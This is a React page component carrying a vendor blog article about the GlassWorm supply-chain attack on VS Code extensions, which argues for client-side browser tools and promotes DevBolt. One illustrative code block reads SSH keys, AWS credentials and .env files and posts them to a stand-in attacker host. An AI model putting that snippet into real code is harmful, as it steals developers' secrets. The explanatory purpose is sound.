import Link from "next/link";

function Code({ children }: { children: React.ReactNode }) {
  return (
    <code className="rounded bg-gray-100 px-1.5 py-0.5 text-sm font-mono text-indigo-600 dark:bg-gray-800 dark:text-indigo-400">
      {children}
    </code>
  );
}

function CodeBlock({ children, title }: { children: string; title?: string }) {
  return (
    <div className="my-6 overflow-hidden rounded-lg border border-gray-200 dark:border-gray-800">
      {title && (
        <div className="border-b border-gray-200 bg-gray-50 px-4 py-2 text-xs font-medium text-gray-500 dark:border-gray-800 dark:bg-gray-900 dark:text-gray-400">
          {title}
        </div>
      )}
      <pre className="overflow-x-auto bg-gray-50 p-4 text-sm leading-relaxed dark:bg-gray-900">
        <code className="font-mono text-gray-800 dark:text-gray-200">
          {children}
        </code>
      </pre>
    </div>
  );
}

function WarningBox({ children }: { children: React.ReactNode }) {
  return (
    <div className="my-6 rounded-lg border-l-4 border-red-500 bg-red-50 p-4 dark:bg-red-950/30 dark:border-red-400">
      <div className="text-sm text-red-800 dark:text-red-300">{children}</div>
    </div>
  );
}

function InfoBox({ children }: { children: React.ReactNode }) {
  return (
    <div className="my-6 rounded-lg border-l-4 border-emerald-500 bg-emerald-50 p-4 dark:bg-emerald-950/30 dark:border-emerald-400">
      <div className="text-sm text-emerald-800 dark:text-emerald-300">
        {children}
      </div>
    </div>
  );
}

function AffiliateBox({ children }: { children: React.ReactNode }) {
  return (
    <div className="my-8 rounded-lg border border-blue-200 bg-blue-50 p-5 dark:border-blue-800 dark:bg-blue-950/30">
      <div className="text-sm text-blue-800 dark:text-blue-300">
        {children}
      </div>
    </div>
  );
}

export default function BrowserToolsVsVscodeExtensions() {
  return (
    <>
      <p className="text-lg text-gray-600 dark:text-gray-400">
        In March 2026, the GlassWorm campaign compromised 433 components across
        GitHub, npm, and VS Code &mdash; including 72 malicious Open VSX
        extensions that mimicked popular developer utilities. The worm harvested
        npm tokens, GitHub credentials, and keystroke data from thousands of
        developers. Meanwhile, every browser-based developer tool on the internet
        remained completely unaffected. This isn&apos;t a coincidence &mdash;
        it&apos;s architecture.
      </p>

      <InfoBox>
        DevBolt&apos;s 110+ tools run entirely in your browser. No extensions to
        install, no permissions to grant, no supply chain to trust. Try the{" "}
        <Link
          href="/tools/code-security-scanner"
          className="font-medium text-emerald-700 underline hover:text-emerald-600 dark:text-emerald-300 dark:hover:text-emerald-200"
        >
          AI Code Security Scanner
        </Link>{" "}
        or{" "}
        <Link
          href="/tools/json-formatter"
          className="font-medium text-emerald-700 underline hover:text-emerald-600 dark:text-emerald-300 dark:hover:text-emerald-200"
        >
          JSON Formatter
        </Link>{" "}
        &mdash; 100% client-side processing.
      </InfoBox>

      {/* ── What Happened: GlassWorm ── */}
      <h2 className="mt-12 mb-4 text-2xl font-semibold text-gray-900 dark:text-white">
        What Happened: The GlassWorm Supply Chain Attack
      </h2>
      <p className="text-gray-600 dark:text-gray-400">
        GlassWorm was first detected in November 2025 in three VS Code
        extensions with thousands of installs. By March 2026, it had evolved
        into a self-propagating worm that spread across multiple platforms
        simultaneously. Here&apos;s the timeline:
      </p>

      <div className="my-6 space-y-4">
        <div className="rounded-lg border border-gray-200 p-4 dark:border-gray-800">
          <p className="font-semibold text-gray-900 dark:text-white">
            November 2025 &mdash; Initial Discovery
          </p>
          <p className="mt-1 text-sm text-gray-600 dark:text-gray-400">
            Three VS Code extensions containing GlassWorm malware are identified
            on the official marketplace. The extensions impersonated popular
            development tools and had accumulated thousands of installs.
          </p>
        </div>
        <div className="rounded-lg border border-gray-200 p-4 dark:border-gray-800">
          <p className="font-semibold text-gray-900 dark:text-white">
            January 31, 2026 &mdash; Open VSX Wave
          </p>
          <p className="mt-1 text-sm text-gray-600 dark:text-gray-400">
            Researchers discover 72 malicious Open VSX extensions linked to
            GlassWorm. These extensions mimic popular linters, formatters, and
            AI coding assistants. They use{" "}
            <Code>extensionPack</Code> and{" "}
            <Code>extensionDependencies</Code> to silently pull in
            malicious packages after establishing trust.
          </p>
        </div>
        <div className="rounded-lg border border-gray-200 p-4 dark:border-gray-800">
          <p className="font-semibold text-gray-900 dark:text-white">
            March 3&ndash;9, 2026 &mdash; Mass GitHub Compromise
          </p>
          <p className="mt-1 text-sm text-gray-600 dark:text-gray-400">
            151+ GitHub repositories are compromised using stolen tokens.
            GlassWorm force-pushes malicious code hidden in invisible Unicode
            characters (Private Use Area ranges U+FE00&ndash;U+FE0F) that render
            as zero-width whitespace in every major code editor and GitHub&apos;s
            review interface.
          </p>
        </div>
        <div className="rounded-lg border border-gray-200 p-4 dark:border-gray-800">
          <p className="font-semibold text-gray-900 dark:text-white">
            March 2026 &mdash; Total Impact
          </p>
          <p className="mt-1 text-sm text-gray-600 dark:text-gray-400">
            433 compromised components identified across GitHub, npm, VS Code,
            and OpenVSX. The worm deploys a multi-stage RAT that force-installs
            a malicious Chrome extension, logs keystrokes, steals cookies, and
            exfiltrates data via a Solana blockchain-based C2 infrastructure
            that cannot be taken down.
          </p>
        </div>
      </div>

      <WarningBox>
        <strong>Key detail:</strong> GlassWorm is self-propagating. Once it
        infects a developer&apos;s machine, it harvests npm tokens, GitHub
        credentials, and OpenVSX access tokens &mdash; then automatically uses
        those to compromise additional packages and extensions. One infected
        developer can silently spread the worm to dozens of downstream projects.
      </WarningBox>

      {/* ── Why VS Code Extensions Are Dangerous ── */}
      <h2 className="mt-12 mb-4 text-2xl font-semibold text-gray-900 dark:text-white">
        Why VS Code Extensions Are a Security Liability
      </h2>
      <p className="text-gray-600 dark:text-gray-400">
        VS Code extensions run with the same privileges as VS Code itself.
        There is no sandbox. No permission system. No runtime isolation. Every
        extension you install gets full access to your machine:
      </p>

      <ul className="mt-4 ml-6 list-disc space-y-3 text-gray-600 dark:text-gray-400">
        <li>
          <strong className="text-gray-900 dark:text-white">
            Full file system access
          </strong>{" "}
          &mdash; read and write any file your user account can access,
          including <Code>~/.ssh</Code>, <Code>~/.aws/credentials</Code>,{" "}
          <Code>.env</Code> files, and your entire codebase
        </li>
        <li>
          <strong className="text-gray-900 dark:text-white">
            Network access
          </strong>{" "}
          &mdash; make arbitrary HTTP requests, open WebSockets, and exfiltrate
          data to any server without any user notification
        </li>
        <li>
          <strong className="text-gray-900 dark:text-white">
            Process execution
          </strong>{" "}
          &mdash; spawn child processes, run shell commands, and execute
          arbitrary binaries on your system
        </li>
        <li>
          <strong className="text-gray-900 dark:text-white">
            Credential access
          </strong>{" "}
          &mdash; read environment variables, access VS Code&apos;s built-in
          secret storage, and intercept authentication tokens used by other
          extensions
        </li>
        <li>
          <strong className="text-gray-900 dark:text-white">
            Silent updates
          </strong>{" "}
          &mdash; extensions auto-update by default, meaning a previously safe
          extension can become malicious with a single publisher push
        </li>
      </ul>

      <p className="mt-4 text-gray-600 dark:text-gray-400">
        A 2026 analysis of 27,261 VS Code extensions found that{" "}
        <strong>8.5% expose sensitive developer data</strong> including access
        tokens and configuration files. And this is the official marketplace
        &mdash; the Open VSX registry used by Cursor, Windsurf, and other VS
        Code forks has even fewer security controls.
      </p>

      <CodeBlock title="What a malicious VS Code extension can do (simplified)">{`// An extension has full Node.js access — no sandbox
const fs = require('fs');
const { execSync } = require('child_process');
const https = require('https');

// Read your SSH keys
const sshKey = fs.readFileSync(
  path.join(os.homedir(), '.ssh', 'id_rsa'), 'utf8'
);

// Read your AWS credentials
const awsCreds = fs.readFileSync(
  path.join(os.homedir(), '.aws', 'credentials'), 'utf8'
);

// Read every .env file in your workspace
const envFiles = execSync(
  'find . -name ".env*" -type f'
).toString();

// Exfiltrate everything silently
https.request({
  hostname: 'attacker.example.com',
  method: 'POST',
  // ... your secrets are gone
});`}</CodeBlock>

      <p className="text-gray-600 dark:text-gray-400">
        This is not a theoretical risk. GlassWorm did exactly this &mdash; at
        scale, across hundreds of extensions, with invisible Unicode characters
        hiding the payload in plain sight.
      </p>

      {/* ── The Browser Sandbox ── */}
      <h2 className="mt-12 mb-4 text-2xl font-semibold text-gray-900 dark:text-white">
        The Browser Sandbox: Why Web Tools Can&apos;t Do This
      </h2>
      <p className="text-gray-600 dark:text-gray-400">
        Every browser tab runs inside a security sandbox enforced by the
        operating system. This isn&apos;t a policy &mdash; it&apos;s a hard
        architectural boundary. A website (or web-based tool) physically cannot:
      </p>

      <div className="my-6 overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-gray-200 dark:border-gray-700">
              <th className="py-3 pr-4 text-left font-semibold text-gray-900 dark:text-white">
                Capability
              </th>
              <th className="py-3 px-4 text-center font-semibold text-gray-900 dark:text-white">
                VS Code Extension
              </th>
              <th className="py-3 pl-4 text-center font-semibold text-gray-900 dark:text-white">
                Browser Tab
              </th>
            </tr>
          </thead>
          <tbody className="text-gray-600 dark:text-gray-400">
            <tr className="border-b border-gray-100 dark:border-gray-800">
              <td className="py-3 pr-4">Read files on disk</td>
              <td className="py-3 px-4 text-center text-red-600 dark:text-red-400 font-semibold">Yes &mdash; any file</td>
              <td className="py-3 pl-4 text-center text-emerald-600 dark:text-emerald-400 font-semibold">No</td>
            </tr>
            <tr className="border-b border-gray-100 dark:border-gray-800">
              <td className="py-3 pr-4">Execute shell commands</td>
              <td className="py-3 px-4 text-center text-red-600 dark:text-red-400 font-semibold">Yes</td>
              <td className="py-3 pl-4 text-center text-emerald-600 dark:text-emerald-400 font-semibold">No</td>
            </tr>
            <tr className="border-b border-gray-100 dark:border-gray-800">
              <td className="py-3 pr-4">Access SSH/AWS/env credentials</td>
              <td className="py-3 px-4 text-center text-red-600 dark:text-red-400 font-semibold">Yes</td>
              <td className="py-3 pl-4 text-center text-emerald-600 dark:text-emerald-400 font-semibold">No</td>
            </tr>
            <tr className="border-b border-gray-100 dark:border-gray-800">
              <td className="py-3 pr-4">Install software / spawn processes</td>
              <td className="py-3 px-4 text-center text-red-600 dark:text-red-400 font-semibold">Yes</td>
              <td className="py-3 pl-4 text-center text-emerald-600 dark:text-emerald-400 font-semibold">No</td>
            </tr>
            <tr className="border-b border-gray-100 dark:border-gray-800">
              <td className="py-3 pr-4">Auto-update with new code</td>
              <td className="py-3 px-4 text-center text-red-600 dark:text-red-400 font-semibold">Yes &mdash; silently</td>
              <td className="py-3 pl-4 text-center text-emerald-600 dark:text-emerald-400 font-semibold">N/A &mdash; no install</td>
            </tr>
            <tr className="border-b border-gray-100 dark:border-gray-800">
              <td className="py-3 pr-4">Persist after closing</td>
              <td className="py-3 px-4 text-center text-red-600 dark:text-red-400 font-semibold">Yes &mdash; always running</td>
              <td className="py-3 pl-4 text-center text-emerald-600 dark:text-emerald-400 font-semibold">No &mdash; tab closes, it&apos;s gone</td>
            </tr>
            <tr>
              <td className="py-3 pr-4">Send data to external servers</td>
              <td className="py-3 px-4 text-center text-red-600 dark:text-red-400 font-semibold">Yes &mdash; silently</td>
              <td className="py-3 pl-4 text-center text-amber-600 dark:text-amber-400 font-semibold">Only if tool makes network calls*</td>
            </tr>
          </tbody>
        </table>
      </div>

      <p className="text-sm text-gray-500 dark:text-gray-400 italic">
        * Browser-based tools <em>can</em> send data to servers &mdash; that&apos;s
        how server-side tools like CodeBeautify operated before their 2025 data
        leak. The key distinction is client-side tools that process everything
        in JavaScript without any network calls. You can verify this yourself
        in DevTools (more on that below).
      </p>

      {/* ── The Supply Chain Problem ── */}
      <h2 className="mt-12 mb-4 text-2xl font-semibold text-gray-900 dark:text-white">
        The Supply Chain Problem with Extension Marketplaces
      </h2>
      <p className="text-gray-600 dark:text-gray-400">
        GlassWorm exploited a fundamental weakness in extension marketplaces:
        trust is implicit, not verified. Here&apos;s how the supply chain attack
        worked:
      </p>

      <ol className="mt-4 ml-6 list-decimal space-y-3 text-gray-600 dark:text-gray-400">
        <li>
          <strong className="text-gray-900 dark:text-white">
            Publish a useful extension
          </strong>{" "}
          &mdash; create a legitimate-looking linter, formatter, or AI assistant
          that works as advertised
        </li>
        <li>
          <strong className="text-gray-900 dark:text-white">
            Accumulate trust
          </strong>{" "}
          &mdash; gather installs, stars, and positive reviews over weeks or
          months
        </li>
        <li>
          <strong className="text-gray-900 dark:text-white">
            Push a malicious update
          </strong>{" "}
          &mdash; add hidden payload via <Code>extensionDependencies</Code> or
          invisible Unicode characters that reviewers can&apos;t see
        </li>
        <li>
          <strong className="text-gray-900 dark:text-white">
            Auto-update delivers the payload
          </strong>{" "}
          &mdash; every developer who installed the extension automatically
          receives the compromised version
        </li>
        <li>
          <strong className="text-gray-900 dark:text-white">
            Harvest and propagate
          </strong>{" "}
          &mdash; steal tokens and credentials, then use them to compromise more
          extensions and repositories
        </li>
      </ol>

      <p className="mt-4 text-gray-600 dark:text-gray-400">
        The Open VSX registry &mdash; used by Cursor, Windsurf, and other VS
        Code forks &mdash; is especially vulnerable. Researchers found that
        these forks recommend extensions that don&apos;t exist yet in the Open
        VSX registry, letting attackers reserve those names and publish
        malicious packages.
      </p>

      <p className="mt-4 text-gray-600 dark:text-gray-400">
        Browser-based tools have no equivalent attack surface. There&apos;s no
        marketplace, no install step, no auto-update, no dependency chain. You
        visit a URL, use the tool, and close the tab. The attack surface is the
        page you&apos;re looking at &mdash; nothing more.
      </p>

      {/* ── Not All Browser Tools Are Equal ── */}
      <h2 className="mt-12 mb-4 text-2xl font-semibold text-gray-900 dark:text-white">
        Not All Browser Tools Are Equal
      </h2>
      <p className="text-gray-600 dark:text-gray-400">
        Browser-based doesn&apos;t automatically mean safe. The 2025
        CodeBeautify/JSONFormatter leak proved that server-side web tools can be
        just as dangerous as compromised extensions &mdash; they send your data
        to a server where it gets stored, leaked, or breached. The critical
        distinction is between:
      </p>

      <div className="my-6 grid gap-4 sm:grid-cols-2">
        <div className="rounded-lg border-2 border-red-200 p-5 dark:border-red-800">
          <p className="font-semibold text-red-700 dark:text-red-400">
            Server-Side Web Tools
          </p>
          <ul className="mt-3 space-y-2 text-sm text-gray-600 dark:text-gray-400">
            <li>&bull; Your data leaves your device</li>
            <li>&bull; Processed on someone else&apos;s server</li>
            <li>&bull; May be stored, logged, or leaked</li>
            <li>&bull; Network requests visible in DevTools</li>
            <li>&bull; Examples: old CodeBeautify, some online formatters</li>
          </ul>
        </div>
        <div className="rounded-lg border-2 border-emerald-200 p-5 dark:border-emerald-800">
          <p className="font-semibold text-emerald-700 dark:text-emerald-400">
            Client-Side Web Tools
          </p>
          <ul className="mt-3 space-y-2 text-sm text-gray-600 dark:text-gray-400">
            <li>&bull; Your data stays in your browser tab</li>
            <li>&bull; Processed locally in JavaScript/WASM</li>
            <li>&bull; Nothing to store, log, or leak</li>
            <li>&bull; Zero network requests during use</li>
            <li>&bull; Examples: DevBolt, some modern tool sites</li>
          </ul>
        </div>
      </div>

      {/* ── How to Verify ── */}
      <h2 className="mt-12 mb-4 text-2xl font-semibold text-gray-900 dark:text-white">
        How to Verify a Tool Is Truly Client-Side
      </h2>
      <p className="text-gray-600 dark:text-gray-400">
        Don&apos;t take anyone&apos;s word for it &mdash; including ours.
        Here&apos;s how to verify any browser-based tool in 30 seconds:
      </p>

      <ol className="mt-4 ml-6 list-decimal space-y-4 text-gray-600 dark:text-gray-400">
        <li>
          <strong className="text-gray-900 dark:text-white">
            Open DevTools
          </strong>{" "}
          &mdash; press <Code>F12</Code> or <Code>Ctrl+Shift+I</Code> (
          <Code>Cmd+Option+I</Code> on Mac)
        </li>
        <li>
          <strong className="text-gray-900 dark:text-white">
            Go to the Network tab
          </strong>{" "}
          &mdash; clear any existing entries
        </li>
        <li>
          <strong className="text-gray-900 dark:text-white">
            Paste sensitive data and run the tool
          </strong>{" "}
          &mdash; format your JSON, decode your JWT, generate your hash
        </li>
        <li>
          <strong className="text-gray-900 dark:text-white">
            Check the Network tab
          </strong>{" "}
          &mdash; if zero requests were made, your data never left your browser.
          If you see POST requests to an API, the tool is server-side
        </li>
      </ol>

      <CodeBlock title="What you should see in DevTools Network tab for a client-side tool">{`// After pasting JSON and clicking "Format":
//
// Network tab: (empty — no requests)
//
// That's it. No XHR, no fetch, no POST.
// Your data was processed entirely in JavaScript
// inside your browser tab.

// What you'd see with a SERVER-SIDE tool:
// POST https://api.sometool.com/format
// Request payload: { "input": "<your entire JSON>" }
// ⚠️ Your data just left your device`}</CodeBlock>

      <InfoBox>
        Try it right now: open DevBolt&apos;s{" "}
        <Link
          href="/tools/json-formatter"
          className="font-medium text-emerald-700 underline hover:text-emerald-600 dark:text-emerald-300 dark:hover:text-emerald-200"
        >
          JSON Formatter
        </Link>
        , open the Network tab, paste some data, and click Format. Zero
        requests. Every one of DevBolt&apos;s 110+ tools works the same way.
      </InfoBox>

      {/* ── What to Do Right Now ── */}
      <h2 className="mt-12 mb-4 text-2xl font-semibold text-gray-900 dark:text-white">
        What You Should Do Right Now
      </h2>
      <p className="text-gray-600 dark:text-gray-400">
        Whether or not you were affected by GlassWorm, this is a good time to
        audit your development environment:
      </p>

      <h3 className="mt-8 mb-3 text-xl font-semibold text-gray-900 dark:text-white">
        1. Audit Your VS Code Extensions
      </h3>
      <p className="text-gray-600 dark:text-gray-400">
        Open your VS Code terminal and run:
      </p>
      <CodeBlock title="List all installed extensions">{`code --list-extensions`}</CodeBlock>
      <p className="text-gray-600 dark:text-gray-400">
        For each extension, ask: do I actually use this? Do I know the
        publisher? When was it last updated? Remove anything you don&apos;t
        actively need. Every extension is attack surface.
      </p>

      <h3 className="mt-8 mb-3 text-xl font-semibold text-gray-900 dark:text-white">
        2. Disable Auto-Update for Extensions
      </h3>
      <p className="text-gray-600 dark:text-gray-400">
        In VS Code settings, set{" "}
        <Code>extensions.autoUpdate</Code> to <Code>false</Code>. Review
        changelogs before accepting updates. This prevents a trusted extension
        from silently becoming malicious.
      </p>

      <h3 className="mt-8 mb-3 text-xl font-semibold text-gray-900 dark:text-white">
        3. Rotate Your Credentials
      </h3>
      <p className="text-gray-600 dark:text-gray-400">
        If you had any of the affected extensions installed, rotate immediately:
      </p>
      <ul className="mt-2 ml-6 list-disc space-y-1 text-gray-600 dark:text-gray-400">
        <li>npm tokens (<Code>npm token revoke</Code>)</li>
        <li>GitHub personal access tokens</li>
        <li>AWS access keys</li>
        <li>SSH keys</li>
        <li>Any API keys stored in environment variables</li>
      </ul>

      <h3 className="mt-8 mb-3 text-xl font-semibold text-gray-900 dark:text-white">
        4. Use Browser-Based Tools for Sensitive Data
      </h3>
      <p className="text-gray-600 dark:text-gray-400">
        For tasks involving credentials, tokens, API keys, or proprietary code,
        use a verified client-side browser tool instead of a VS Code extension.
        The browser sandbox guarantees your data can&apos;t be exfiltrated even
        if the tool&apos;s JavaScript is compromised &mdash; it simply
        can&apos;t access your file system, shell, or credentials.
      </p>

      <h3 className="mt-8 mb-3 text-xl font-semibold text-gray-900 dark:text-white">
        5. Scan Your Code for Vulnerabilities
      </h3>
      <p className="text-gray-600 dark:text-gray-400">
        GlassWorm hid payloads in invisible Unicode characters. Run a security
        scan on any recently modified code to check for hidden characters,
        hardcoded secrets, and injection patterns.
      </p>

      <InfoBox>
        DevBolt&apos;s{" "}
        <Link
          href="/tools/code-security-scanner"
          className="font-medium text-emerald-700 underline hover:text-emerald-600 dark:text-emerald-300 dark:hover:text-emerald-200"
        >
          AI Code Security Scanner
        </Link>{" "}
        checks for 25 vulnerability patterns including hardcoded secrets,
        injection, XSS, and SSRF &mdash; all client-side. Pair it with the{" "}
        <Link
          href="/tools/code-complexity-analyzer"
          className="font-medium text-emerald-700 underline hover:text-emerald-600 dark:text-emerald-300 dark:hover:text-emerald-200"
        >
          Code Complexity Analyzer
        </Link>{" "}
        to spot high-risk functions.
      </InfoBox>

      {/* ── The Bigger Picture ── */}
      <h2 className="mt-12 mb-4 text-2xl font-semibold text-gray-900 dark:text-white">
        The Bigger Picture: Trust Boundaries in Developer Tooling
      </h2>
      <p className="text-gray-600 dark:text-gray-400">
        GlassWorm isn&apos;t an isolated incident. It&apos;s part of a pattern:
      </p>

      <ul className="mt-4 ml-6 list-disc space-y-2 text-gray-600 dark:text-gray-400">
        <li>
          <strong className="text-gray-900 dark:text-white">
            November 2025
          </strong>{" "}
          &mdash; CodeBeautify/JSONFormatter data leak exposes 5 GB of developer
          credentials (server-side web tools)
        </li>
        <li>
          <strong className="text-gray-900 dark:text-white">
            November 2025
          </strong>{" "}
          &mdash; first GlassWorm extensions found on VS Code Marketplace
        </li>
        <li>
          <strong className="text-gray-900 dark:text-white">
            January 2026
          </strong>{" "}
          &mdash; VS Code forks found recommending non-existent Open VSX
          extensions, enabling name-squatting attacks
        </li>
        <li>
          <strong className="text-gray-900 dark:text-white">
            March 2026
          </strong>{" "}
          &mdash; GlassWorm compromises 433 components across GitHub, npm, VS
          Code, and Open VSX
        </li>
      </ul>

      <p className="mt-4 text-gray-600 dark:text-gray-400">
        The common thread: developer tools with excessive access to your system.
        Server-side tools access your data. Extensions access your entire
        machine. The only architecture that provides a genuine security
        guarantee is client-side code running inside a browser sandbox.
      </p>

      <p className="mt-4 text-gray-600 dark:text-gray-400">
        This doesn&apos;t mean you should stop using VS Code or extensions
        entirely. It means you should apply the principle of least privilege:
        don&apos;t grant system-level access for tasks that can be done in a
        browser tab. Format JSON in a browser. Decode JWTs in a browser. Test
        regex patterns in a browser. Reserve VS Code extensions for
        functionality that genuinely requires IDE integration.
      </p>

      <AffiliateBox>
        <strong>Building secure applications?</strong>{" "}
        <a
          href="https://www.digitalocean.com/?refcode=placeholder&utm_campaign=Referral_Invite&utm_medium=Referral_Program"
          target="_blank"
          rel="noopener sponsored"
          className="font-medium text-blue-700 underline hover:text-blue-600 dark:text-blue-300 dark:hover:text-blue-200"
        >
          DigitalOcean
        </a>{" "}
        offers managed databases, firewalls, and VPC networks with
        infrastructure-level security. Start with $200 in free credits.
      </AffiliateBox>

      {/* ── FAQ ── */}
      <h2 className="mt-12 mb-4 text-2xl font-semibold text-gray-900 dark:text-white">
        Frequently Asked Questions
      </h2>

      <div className="space-y-6">
        <div>
          <h3 className="text-lg font-semibold text-gray-900 dark:text-white">
            Was I affected by GlassWorm?
          </h3>
          <p className="mt-2 text-gray-600 dark:text-gray-400">
            If you installed VS Code extensions from the Open VSX marketplace
            between January and March 2026, or if you use a VS Code fork like
            Cursor or Windsurf that pulls from Open VSX, you should audit your
            extensions and rotate credentials as a precaution. Cursor, Windsurf,
            and Google have since rolled out fixes, and the Eclipse Foundation
            (which runs Open VSX) has implemented broader registry-level
            safeguards.
          </p>
        </div>

        <div>
          <h3 className="text-lg font-semibold text-gray-900 dark:text-white">
            Are browser extensions (Chrome, Firefox) also risky?
          </h3>
          <p className="mt-2 text-gray-600 dark:text-gray-400">
            Browser extensions have more restricted permissions than VS Code
            extensions &mdash; Chrome extensions must declare permissions
            upfront, and users must explicitly grant them. However, they still
            have more access than a plain web page. The safest option remains
            a standard browser tab with no extensions involved.
          </p>
        </div>

        <div>
          <h3 className="text-lg font-semibold text-gray-900 dark:text-white">
            Can a malicious website break out of the browser sandbox?
          </h3>
          <p className="mt-2 text-gray-600 dark:text-gray-400">
            Browser sandbox escapes exist but are exceptionally rare and
            valuable (worth millions in bug bounties). They are patched rapidly
            and used in targeted state-level attacks, not mass developer tool
            compromises. For practical threat modeling, the browser sandbox is
            the strongest security boundary available to most developers.
          </p>
        </div>

        <div>
          <h3 className="text-lg font-semibold text-gray-900 dark:text-white">
            Why doesn&apos;t VS Code add a permission system for extensions?
          </h3>
          <p className="mt-2 text-gray-600 dark:text-gray-400">
            This has been requested since 2018 (VS Code issue #52116). The core
            challenge is that many popular extensions legitimately need broad
            access (debuggers, language servers, terminal integrations). As of
            VS Code 1.97, Microsoft added publisher trust dialogs for
            first-install, but there&apos;s still no runtime sandbox or
            per-permission system.
          </p>
        </div>

        <div>
          <h3 className="text-lg font-semibold text-gray-900 dark:text-white">
            How does DevBolt ensure its tools stay safe?
          </h3>
          <p className="mt-2 text-gray-600 dark:text-gray-400">
            Every DevBolt tool runs entirely in your browser using client-side
            JavaScript. There are no server-side API calls for tool processing,
            no user accounts required, and no data collection. The source code
            is{" "}
            <a
              href="https://github.com/benwalker14/free-solo-tools"
              target="_blank"
              rel="noopener"
              className="text-indigo-600 underline hover:text-indigo-500 dark:text-indigo-400"
            >
              open on GitHub
            </a>{" "}
            &mdash; you can verify every tool&apos;s behavior by reading the code
            or checking the Network tab in DevTools.
          </p>
        </div>
      </div>
    </>
  );
}
